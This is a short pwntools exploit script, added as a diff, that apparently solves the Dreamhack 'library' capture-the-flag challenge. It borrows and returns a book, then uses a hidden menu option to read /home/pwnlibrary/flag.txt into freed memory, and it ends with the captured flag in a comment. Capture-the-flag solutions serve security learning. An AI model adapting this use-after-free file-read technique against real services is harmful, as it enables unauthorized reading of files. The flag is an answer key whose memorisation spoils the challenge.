@@ -1,0 +1,32 @@
+from pwn import *
+
+script = '''
+'''
+
+p = remote("host1.dreamhack.games", 12311)
+#p = process("./library")
+#p = gdb.debug("./library", gdbscript = script)
+
+def borrow_book(select):
+    p.sendlineafter(b"menu : ", b"1")
+    p.sendlineafter(b"borrow? : ", f"{select}".encode())
+    
+def read_book(select):
+    p.sendlineafter(b"menu : ", b"2")
+    p.sendlineafter(b"read? : ", f"{select}".encode())
+
+def return_book():
+    p.sendlineafter(b"menu : ", b"3")
+
+def steal_book(path, pages):
+    p.sendlineafter(b"menu : ", f"{0x113}".encode())
+    p.sendlineafter(b"book? : ", path.encode())
+    p.sendlineafter(b"(MAX 400) : ", f"{pages}".encode())
+    
+borrow_book(1)
+return_book()
+steal_book("/home/pwnlibrary/flag.txt", 0x100)
+read_book(0)
+
+p.interactive()
+#DH{0fdbcef449355e5fb15f4a674724a3c8}
